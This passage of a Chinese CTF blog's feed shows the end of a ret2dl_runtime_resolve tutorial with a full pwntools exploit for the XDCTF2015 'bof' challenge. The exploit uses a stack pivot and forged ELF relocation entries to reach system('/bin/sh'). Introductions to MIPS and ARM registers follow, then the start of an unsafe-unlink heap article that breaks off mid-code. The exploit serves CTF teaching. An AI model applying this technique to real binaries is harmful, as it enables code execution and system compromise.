class="line">  <span class="comment">//查找重定位表的位置，这里的reloc_offset是reloc_arg的意思</span></span><br><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">  <span class="comment">//查找reloc中的r_info结构体成员</span></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  <span class="comment">//判断低位是否为7</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">  <span class="comment">//查找dynstr表中的字符串名字</span></span><br><span class="line">  result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="comment">//将对应的函数地址放入GOT表中</span></span><br><span class="line">  value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">   sym ? (LOOKUP_VALUE_ADDRESS (result)</span><br><span class="line">  + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过讲解<code>_dl_runtime_resolve_</code>函数，我们也很容易的想到利用点：</p><p>​    1.通过控制reloc_arg来实现伪造最终获取的函数字符串</p><p>​    2.修改.dynamic内存区域实现伪造最终获取的函数字符串</p><p>​    3.伪造link_map的地址</p><p>用一道经典例题讲解第一种情况</p><h4 id="XDCTF2015-bof"><a href="#XDCTF2015-bof" class="headerlink" title="XDCTF2015_bof"></a>XDCTF2015_bof</h4><p>先看看保护，我们看到开启了<code>Partial RELRO</code>，所以咱修改不了<code>.dynamic</code>，另外还开启了<code>NX</code>保护，也写不了<code>shellcode</code>到栈上</p><img src="/2021/10/05/ret2dl-runtime-resovle/12.png" class=""><p>程序的流程十分的简单，打印出<code>Welcome to XDCTF2015~!</code>，紧接着就是一个溢出函数</p><img src="/2021/10/05/ret2dl-runtime-resovle/13.png" class=""><p>我们按照正常的思路走一遍，一般拿到栈溢出，我们首先就是看有无<code>libc</code>，这题没有给出，然后就是后门函数，<code>system( )</code>函数，<code>/bin/sh</code>字符串，很遗憾都没有，看到这一般都会想到<code>ret2libc</code>，但是当我去查看<code>ROPgadget</code>的时候，发现这个动态链接的文件它的<code>gadget</code>少的离谱，所以<code>ret2libc</code>这条路也走不通了，那只能没有轮子咱们造一个轮子了—-<code>ret2dl_runtime_resovle</code></p><img src="/2021/10/05/ret2dl-runtime-resovle/14.png" class=""><p>先通过<code>cyclic</code>计算一下溢出的偏移位置</p><img src="/2021/10/05/ret2dl-runtime-resovle/11.png" class=""><p>从源码中也可以看出它并没有对<code>reloc_arg</code>参数进行边界校验，导致我们即使传进去的<code>reloc_arg</code>再大，它也不会报错，所以我们就传入一个大的<code>reloc_arg</code>，将重定位表劫持到一个我们可控的地方，比如<code>.bss</code>段，所以很容易就可以想到，通过栈迁移将栈迁移到<code>.bss</code>段</p><p>根据上面的源码，我们可以知道，要构造的有3样东西<code>.rel.plt</code>，<code>.dynstr</code>，<code>.dynsym</code></p><p>我们一步步来，先伪造<code>.rel.plt</code>，<code>.rel.plt</code>有两个结构体成员，第一个是<code>r_offset</code>，为函数的<code>GOT</code>表地址，我们将其填写成<code>write</code>的<code>GOT</code>表地址，第二个是<code>r_info</code>，这个就比较重要了，我们先来回忆一下它是怎么被索引到的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rel.plt + reloc_arg = r_offset </span><br><span class="line"></span><br><span class="line">r_offset + <span class="number">4</span> = r_info</span><br></pre></td></tr></table></figure><p>我们刚刚说到源码中没有对<code>reloc_arg</code>参数进行边界校验，那我们就可以伪造<code>r_offset</code>和<code>r_info</code>到一个我们可控的地方</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rel.plt + fake_arg = fake_r_offset </span><br><span class="line"></span><br><span class="line">fake_r_offset  + <span class="number">4</span> = fake_r_info</span><br></pre></td></tr></table></figure><p>代码如下，我们先不关注<code>(fake_sym_addr - dynsym)/16</code>是什么我们先留个印象，这里为什么要加上7呢？因为要绕过这个<code>assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">relo_offset = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">relo_info = (((fake_sym_addr - dynsym)/<span class="number">16</span>) &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br></pre></td></tr></table></figure><p>接下来就是<code>.dynsym</code>，它怎么索引到<code>.dynsym</code>的呢，是不是<code>relo_info &gt;&gt; 8</code> 作为<code>.dynsym</code>中的下标，所以我们要在<code>relo_info</code>上做手脚，通过<code>(fake_sym_addr - dynsym)/16</code>来让它索引到<code>fake_dynsym</code>，除于<code>16</code>是因为一个<code>Elf32_Sym</code>大小是<code>16</code>字节，这里还要注意的是要进行对齐！！！</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fake_sym_addr = bss_addr + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br></pre></td></tr></table></figure><p>最后就是<code>.dynstr</code>了，这个就很简单了，只需要构造<code>st_name</code>让他找到我们伪造的字符串，它原来是通过<code>.dynstr + st_name</code>来索引的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.dynstr + st_name = func_str</span><br><span class="line"></span><br><span class="line">.dynstr + fake_st_name = fake_func_str</span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fake_str_addr = fake_sym_addr + <span class="number">16</span></span><br><span class="line"></span><br><span class="line">fake_name = fake_str_addr - strtab</span><br></pre></td></tr></table></figure><p>完整EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;bof&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.27.so&#x27;)</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;bof&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;26743&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span> + stack_size</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss_addr))</span><br><span class="line">pop_ebp_ret = <span class="number">0x804861b</span></span><br><span class="line">leave_ret = <span class="number">0x8048458</span></span><br><span class="line">link_map = <span class="number">0x8048380</span></span><br><span class="line">dynsym = <span class="number">0x80481d8</span></span><br><span class="line">strtab = <span class="number">0x08048278</span></span><br><span class="line">rel_plt = <span class="number">0x8048330</span></span><br><span class="line">pop_esi_pop_edi_pop_ebp_ret = <span class="number">0x08048619</span></span><br><span class="line"><span class="comment">#align = 0x10 - ((bss_addr + 36 - dynsym) % 16) </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(pop_esi_pop_edi_pop_ebp_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line">payload += p32(<span class="number">100</span>)</span><br><span class="line">payload += p32(pop_ebp_ret)</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line">payload += p32(leave_ret)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#arge</span></span><br><span class="line">fake_relo_addr = bss_addr + <span class="number">28</span></span><br><span class="line">fake_arge = fake_relo_addr - rel_plt</span><br><span class="line"></span><br><span class="line"><span class="comment">#sym</span></span><br><span class="line">fake_sym_addr = bss_addr + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line"></span><br><span class="line"><span class="comment">#relo</span></span><br><span class="line">relo_offset = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">relo_info = (((fake_sym_addr - dynsym)/<span class="number">16</span>) &lt;&lt; <span class="number">8</span>)+<span class="number">0x7</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;relo &quot;</span> + <span class="built_in">hex</span>(relo_info))</span><br><span class="line"></span><br><span class="line"><span class="comment">#str</span></span><br><span class="line">fake_str_addr = fake_sym_addr + <span class="number">16</span></span><br><span class="line">fake_name = fake_str_addr - strtab</span><br><span class="line">bin_sh_addr = bss_addr + <span class="number">80</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(link_map)</span><br><span class="line">payload += p32(fake_arge)</span><br><span class="line">payload += <span class="string">&quot;AAAA&quot;</span></span><br><span class="line">payload += p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line"></span><br><span class="line">payload += p32(relo_offset)</span><br><span class="line">payload += p32(relo_info)</span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(fake_name)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">&quot;system\x00&quot;</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += cmd + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(payload))</span><br><span class="line"><span class="comment">#payload += &quot;/bin/sh\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF小知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从MIPS的发展史开始学MIPS</title>
      <link href="/2021/10/05/%E4%BB%8EMIPS%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6MIPS/"/>
      <url>/2021/10/05/%E4%BB%8EMIPS%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6MIPS/</url>
      
        <content type="html"><![CDATA[<h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p>​        当初和ARM比肩的MIPS，由于决策的问题和命途多舛，MIPS架构开始逐渐没落，曾经的辉煌也慢慢暗淡，但世间还残留着MIPS架构的余光，在目前的游戏机，打印机，路由器还有很多是MIPS架构的CPU，所以MIPS的学习并不能落下，而且学习各种CPU架构的设计思路，对于理解计算机也有着很大的帮助，虽然MIPS没落了，但RISC-V会带着它的余光继续前进…</p><p><a href="https://zhuanlan.zhihu.com/p/356011887">全球三大芯片架构之一MIPS倒下！转身投入RISC-V阵营</a></p><p><a href="https://zhuanlan.zhihu.com/p/97572364">MIPS，路在何方？</a></p><h2 id="MIPS各寄存器介绍与对比"><a href="#MIPS各寄存器介绍与对比" class="headerlink" title="MIPS各寄存器介绍与对比"></a>MIPS各寄存器介绍与对比</h2><p>与ARM和相比，MIPS也有很多特殊的特性，这些特性都旨在帮助CPU更好的完成工作</p><ol><li><p><strong>$zero寄存器</strong>时刻保存着常量0，至于为什么这么做，答：还是为了效率</p><blockquote><p>零寄存器始终保持常量 0，除了 0 恰好是一个非常有用的常量这一事实之外，它并没有什么特别之处。如此有用以至于 MIPS 设计者专门使用一个寄存器来保存其值。（这样你就不必浪费另一个寄存器或任何内存来保存值。）</p></blockquote></li><li><blockquote><p>$1:即$at，该寄存器为汇编保留，由于<a href="https://blog.csdn.net/wlswls1711/article/details/106364882/">I型指令</a>的立即数字段只有16位，在加载大常数时，编译器或汇编程序需要<br>把大常数拆开，然后重新组合到寄存器里。比如加载一个32位立即数需要 lui（装入高位立即数）和addi两条<br>指令。像MIPS程序拆散和重装大常数由汇编程序来完成，汇编程序必需一个临时寄存器来重组大常数，这<br>也是为汇编 保留$at的原因之一</p></blockquote><img src="/2021/10/05/%E4%BB%8EMIPS%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6MIPS/3.png" class=""></li><li><p>v0<del>v1是函数调用返回之后的值，v也就是values的意思，a0</del>a3就是函数的参数，如果有更多的参数，则通过栈来传递，t0<del>t9都是Temporary寄存器，可以理解为随便使用，但需要注意的是t7和t8，t9并不是挨在一起的，中间还搁着s0</del>s7，着8个寄存器那就不是随便使用的了，如果要使用他们必须将他们保存，否则程序可能会出现非预期的错误，k0~k1是给操作系统使用的，暂不考虑</p></li><li><p>剩下的就是有特殊用途的寄存器，对应的英文也标识了，很容易理解，这里强调一下$ra寄存器，当调用的函数属于叶子函数的时候，会直接把返回值放到$ra寄存器里面，若是非叶子函数的话，就会把返回地址放到栈上，稍微解释一下叶子函数：此函数自身不再调用别的函数就称之为叶子函数</p></li></ol><table><thead><tr><th align="left">寄存器编号</th><th align="left">别名</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">$0</td><td align="left">$zero</td><td align="left">常量0(constant value 0)</td></tr><tr><td align="left">$1</td><td align="left">$at</td><td align="left">保留给汇编器(Reserved for assembler)</td></tr><tr><td align="left">$2-$3</td><td align="left">$v0-$v1</td><td align="left">函数调用返回值(values for results and expression evaluation)</td></tr><tr><td align="left">$4-$7</td><td align="left">$a0-$a3</td><td align="left">函数调用参数(arguments)</td></tr><tr><td align="left">$8-$15</td><td align="left">$t0-$t7</td><td align="left">暂时的(Temporary)</td></tr><tr><td align="left">$16-$23</td><td align="left">$s0-$s7</td><td align="left">保存的(或如果用，需要SAVE/RESTORE的)</td></tr><tr><td align="left">$24-$25</td><td align="left">$t8-$t9</td><td align="left">暂时的(Temporary)</td></tr><tr><td align="left">$26-$27</td><td align="left">$k0-$k1</td><td align="left">内核的(kernel)</td></tr><tr><td align="left">$28</td><td align="left">$gp</td><td align="left">全局指针(Global Pointer)</td></tr><tr><td align="left">$29</td><td align="left">$sp</td><td align="left">堆栈指针(Stack Pointer)</td></tr><tr><td align="left">$30</td><td align="left">$fp/$s8</td><td align="left">栈帧指针(Frame Pointer)</td></tr><tr><td align="left">$31</td><td align="left">$ra</td><td align="left">返回地址(return address)</td></tr></tbody></table><p>MIPS寄存器经典表格，但是我看到之后就有点疑惑，为啥MIPS的寄存器有个别名的东西，奇了怪了，还真没见过，那它为啥要有别名呢？网上的解释是”注记符”，但是它既然好记为啥不直接拿它命名呢？在ARM上也是以r开头命名的，并没有这么易懂的别名</p><p><a href="https://mathcs.holycross.edu/~csci226/MIPS/summaryHO.pdf">The MIPS Instruction Set</a></p><p>在和常见的X86和X64对比下更容易明白他们之间的差别和各自的好处：</p><table><thead><tr><th>架构</th><th>x86</th><th>X64</th><th>ARM</th><th>MIPS</th></tr></thead><tbody><tr><td>函数返回值</td><td>eax</td><td>rax</td><td>r0</td><td>v0~v1</td></tr><tr><td>函数调用参数</td><td>栈</td><td>rdi-rsi-rdx-rcx-r8-r9；栈</td><td>r0~r3；栈</td><td>a0~a3；栈</td></tr><tr><td>栈指针</td><td>ebp；esp</td><td>rbp；rsp</td><td>fp(r11)；sp(r13)</td><td>fp/s8；sp</td></tr><tr><td>返回地址</td><td>进入子函数时会将返回地址压入栈中</td><td>进入子函数时会将返回地址压入栈中</td><td>lr(r14)寄存器保存着子程序的返回地址</td><td>ra寄存器保留程序的返回地址（叶子函数）</td></tr><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h2 id="MIPS汇编指令"><a href="#MIPS汇编指令" class="headerlink" title="MIPS汇编指令"></a>MIPS汇编指令</h2><img src="/2021/10/05/%E4%BB%8EMIPS%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6MIPS/1.png" class=""><p>IDA上有个很好用的选项，Options =&gt; General =&gt; Auto comments ，当你把它勾选上的时候，IDA会在一些指令的旁边显示注释帮助你理解这条汇编指令大致在做什么事情：</p><img src="/2021/10/05/%E4%BB%8EMIPS%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6MIPS/2.jpg" class=""><h2 id="MPIS缓存问题"><a href="#MPIS缓存问题" class="headerlink" title="MPIS缓存问题"></a>MPIS缓存问题</h2><p><a href="https://blog.senr.io/blog/why-is-my-perfectly-good-shellcode-not-working-cache-coherency-on-mips-and-arm">为什么我完美的 Shellcode 不起作用？：MIPS 和 ARM 上的缓存一致性</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> MIPS!MIPS!MIPS! </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从ARM的发展史开始学ARM</title>
      <link href="/2021/10/05/%E4%BB%8EARM%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6ARM/"/>
      <url>/2021/10/05/%E4%BB%8EARM%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6ARM/</url>
      
        <content type="html"><![CDATA[<h1 id="从ARM的发展史开始学ARM"><a href="#从ARM的发展史开始学ARM" class="headerlink" title="从ARM的发展史开始学ARM"></a>从ARM的发展史开始学ARM</h1><h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p>第一个ARM处理器是1983年10月-1985年4月间在英国剑桥的Acorn Computer公司开发的。那时候ARM代表Acon RISC Machine公司，并一直持续到Advanced RISC Machinelimited(ARM Limited)在1990年成立之前。</p><p>Aconn因为BBC(英国广播公司)微型计算机的成功而在英国个人计算机市场占据了强有力的位置。BBC微型计算机是以8位6502微处理器为核心的机器。</p><p>随着BBC在1982年1月一系列电视节日的介绍，它迅速成为英国学校的主流机器。它还在计算<br>机爱好者的市场上享有热烈的支持，并找到了进人–些研究性实验室和高等教育组织的途径。<br>随着BBC微机的成功，Acorn的工程师考虑用不同的微处理器去构造另一种机器。他们发现所有的商业供货均不充足。1983年可得到的16位CISC微处理器比标准的存储器部件还慢。它们也有一些多时钟周期完成的指令(在一些情况下，需要数百个时钟周期),使其有很长的中断等待时间。BBC微机很大程度上得益于6502的快速中断响应。因此，Acorn的设计者不愿意接受处理器性能方面的退步。<br>由于在商业微处理器的供货方面遭受的这些挫折，专有微处理器的设计被提到议<br>事日程。主要的障碍是Acorn小组知道商业微处理器需要花费数百个人年的设计努力。Acorn不可能指望这样规模的投资,因为它是一个总共仅有400多雇员的公司。他们必须用少量的设计成本生户出比较好的产品，而且除了为BBC微机设计过少量的小规模门阵列之外它们在全定制芯片设计方面没有任何经验。<br>在这明显不可能的情况下，伯克利RISCI的论文带来一线生机。它是由少数研究生在一年内设计完成的处理器，品质与领先的商业货源不相上下。它的结构简单，因而<br>没有复杂的指令来损害中断执行时间。还有。些支持的论据，认为它能指引未来的道<br>路，虽然技术的优点不论怎样得到学术界的支持也不能保证商业的成功。<br>ARM由于各种因素的偶然组合而诞生，成为Acorn产品线的核心部分。后来，在明智地将缩写字ARM的意义修改为Advanced RISC Machine以后，它把它的名字借给新组成的公司去在Acorn的产品范围之外扩展市场。尽管名称变化了,体系结构仍保持同原Acorn的设计相近。</p><p><a href="https://zhuanlan.zhihu.com/p/370771150">ARM芯片的发展历史</a></p><p><a href="https://zhuanlan.zhihu.com/p/198903715">ARM发家史，一家无名公司的逆袭</a></p><h2 id="ARM芯片的命名"><a href="#ARM芯片的命名" class="headerlink" title="ARM芯片的命名"></a>ARM芯片的命名</h2><p>ARM的芯片有几种版本号</p><ul><li>ARM内核版本号</li><li>ARM SoC的版本号</li><li>芯片的型号</li></ul><h2 id="ARM架构寄存器介绍"><a href="#ARM架构寄存器介绍" class="headerlink" title="ARM架构寄存器介绍"></a>ARM架构寄存器介绍</h2><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><p>32位的ARM有16个寄存器（不包含标志位寄存器），通常R0~R10都是通用寄存器，而其他的寄存器都是有特定功能的寄存器，相比之下X86只有9个寄存器</p><ol><li>R0~R3用作<strong>传递参数</strong>的，如果参数大于4个就用栈来传递，在X86架构下的传递参数是通过栈来完成的，在X86-64下才用6个寄存器来传递参数，R0是函数的返回值，和RAX差不多</li><li>R4~R11是保持局部变量的寄存器，也就是说<strong>子程序在运行期间若要使用这些寄存器在进入的时候要保存这类寄存器的值</strong>，R7存放了<strong>系统调用号</strong>，R11是BP</li><li>R12是<strong>过程调用中间临时寄存器</strong>，叫做IP，R13是SP（栈指针），R14<strong>是连接寄存器，叫做LR，保持子程序的返回地址</strong>，R15就是程序计数器（PC），<strong>存储当前指令的地址加8（两个ARM指令），在Thumb（v1）状态下存储当前指令的地址加4（两个Thumb指令）。这与x86不同，x86中PC始终指向要执行的下一条指令</strong></li></ol><img src="/2021/10/05/%E4%BB%8EARM%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6ARM/1.png" class=""><p>和X86相比，有几点不同之处：</p><ol><li>32位就已经开始用寄存器传递参数</li><li>有专门的寄存器是存储系统调用号的</li><li>多了两个关于子程序的寄存器R12和R14</li></ol><img src="/2021/10/05/%E4%BB%8EARM%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6ARM/2.png" class=""><h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><p>和32位大差不差，就是把R换成了X，位数翻倍并加多了一些寄存器</p><img src="/2021/10/05/%E4%BB%8EARM%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6ARM/image-20210902171755319.png" class="" title="image-20210902171755319"><h2 id="ARM汇编指令"><a href="#ARM汇编指令" class="headerlink" title="ARM汇编指令"></a>ARM汇编指令</h2><h2 id="ARM特色"><a href="#ARM特色" class="headerlink" title="ARM特色"></a>ARM特色</h2><h4 id="指令定长"><a href="#指令定长" class="headerlink" title="指令定长"></a>指令定长</h4><h4 id="Thumb"><a href="#Thumb" class="headerlink" title="Thumb"></a>Thumb</h4><p>Thumb是ARM的另一个指令集，也就是说ARM和Intel的指令集不同，它有两套指令集，一个是前面说的Thumb，另一个就是传统的ARM指令集，它们两个不同的地方就在于指令的长度不同，Thumb 指令每条 16 位长，并有相应的 32 位 ARM 指令，而传统的ARM都是32位的，所以Thumb是2字节的指令，传统的ARM是四字节的，需要注意的是当标志位寄存器当中的第5位为1时是Thumb模式</p><img src="/2021/10/05/%E4%BB%8EARM%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6ARM/4.png" class=""><p><a href="https://www.cnblogs.com/zhangshenghui/p/5944964.html">ARM程序状态寄存器</a></p><p><a href="https://www.embedded.com/introduction-to-arm-thumb/">介绍 ARM 中的thumb</a></p><p>它为啥需要两个指令集呀？在这就要引入一个概念**”代码密度”**，我们都知道ARM架构千好万好，其本质还是RISC决定的，但是它有一个很要命的缺点，就是和CISC相比RISC的代码密度低，其代码密度低是指令定长的缘故，代码密度低会导致任何时候只有少部分指令被加载进Cache，这就意味着Cache的命中率大幅度降低，这时候CPU的工作效率就会明显减弱，与此同时功耗也会增加，最初解决这个问题的方法也很简单，就是增加它的带宽，但有个更好的办法就是Thumb，Thumb指令集是传统ARM指令集的压缩版，但它还是有保留一下传统ARM指令集的指令，并加入动态解压缩软件，使得代码密度的问题得到了解决</p>]]></content>
      
      
      
        <tags>
            
            <tag> ARM!ARM!ARM! </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆漏洞系列（一）-- unsafe unlink</title>
      <link href="/2021/10/05/unsafe-unlink/"/>
      <url>/2021/10/05/unsafe-unlink/</url>
      
        <content type="html"><![CDATA[<blockquote><p>以前一直搞不明白<code>unlink</code>，直到学了点数据结构….</p></blockquote><p><code>unlink</code>分为<strong>向前合并</strong>和<strong>向后合并</strong>两种脱链方式，是为了减少堆块的碎片化所提出的，当一个处于free状态的堆块的前后堆块被<code>free</code>的时候，就是触发<code>unlink</code>机制将两个小的堆块合并成一个大的堆块，<code>unsafe unlink</code>问题就是出现在合并的时候检查没有到位导致的</p><p>wiki上的脱链示意图，当进行脱链的时候FD的<code>bk</code>指向BK，BK的<code>fd</code>指向FD</p><img src="/2021/10/05/unsafe-unlink/1.png" class=""><p>但是<code>unlink</code>也不是随便进行的，还需要通过下面的检查才能进行<code>unlink</code>，但在很早以前，它并没有这种机制，我们先通过介绍没有检查的情况，然后在此基础上进行修改，实现现在的<code>unlink</code>攻击手法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr 